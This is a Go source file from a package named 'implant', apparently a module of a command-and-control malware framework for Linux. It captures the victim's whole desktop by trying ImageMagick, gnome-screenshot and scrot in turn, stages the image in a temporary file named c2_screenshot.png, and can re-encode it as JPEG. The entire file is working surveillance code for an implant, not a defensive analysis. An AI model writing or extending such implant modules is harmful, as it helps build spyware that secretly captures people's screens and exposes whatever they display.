//go:build linux

package implant

import (
	"bytes"
	"context"
	"fmt"
	"image/jpeg"
	"image/png"
	"os"
	"os/exec"
	"time"
)

// CaptureScreenshot captures the entire desktop and returns PNG-encoded bytes.
// Tries several common screenshot tools in order.
func CaptureScreenshot() ([]byte, error) {
	ctx, cancel := context.WithTimeout(context.Background(), 15*time.Second)
	defer cancel()

	// 1. Try ImageMagick import (most reliable)
	output, err := exec.CommandContext(ctx, "import", "-window", "root", "/dev/stdout").Output()
	if err == nil && len(output) > 4 && isPNG(output) {
		return output, nil
	}

	// 2. Try gnome-screenshot
	tmpPath := "/tmp/c2_screenshot.png"
	_ = os.Remove(tmpPath)

	cmd := exec.CommandContext(ctx, "gnome-screenshot", "-f", tmpPath)
	if err := cmd.Run(); err == nil {
		data, readErr := os.ReadFile(tmpPath)
		os.Remove(tmpPath)
		if readErr == nil && len(data) > 4 && isPNG(data) {
			return data, nil
		}
	}

	// 3. Try scrot
	cmd = exec.CommandContext(ctx, "scrot", tmpPath)
	if err := cmd.Run(); err == nil {
		data, readErr := os.ReadFile(tmpPath)
		os.Remove(tmpPath)
		if readErr == nil && len(data) > 4 && isPNG(data) {
			return data, nil
		}
	}

	os.Remove(tmpPath)
	return nil, fmt.Errorf("no screenshot tool available (tried: import, gnome-screenshot, scrot)")
}

// CaptureScreenshotJPEG captures the desktop and returns JPEG-encoded bytes.
// First captures PNG, then re-encodes as JPEG at the given quality (1-100).
func CaptureScreenshotJPEG(quality int) ([]byte, error) {
	pngData, err := CaptureScreenshot()
	if err != nil {
		return nil, err
	}

	img, err := png.Decode(bytes.NewReader(pngData))
	if err != nil {
		return nil, fmt.Errorf("PNG decode: %w", err)
	}

	var buf bytes.Buffer
	if err := jpeg.Encode(&buf, img, &jpeg.Options{Quality: quality}); err != nil {
		return nil, fmt.Errorf("JPEG encode: %w", err)
	}
	return buf.Bytes(), nil
}

func isPNG(data []byte) bool {
	return len(data) >= 4 && data[0] == 0x89 && data[1] == 'P' && data[2] == 'N' && data[3] == 'G'
}
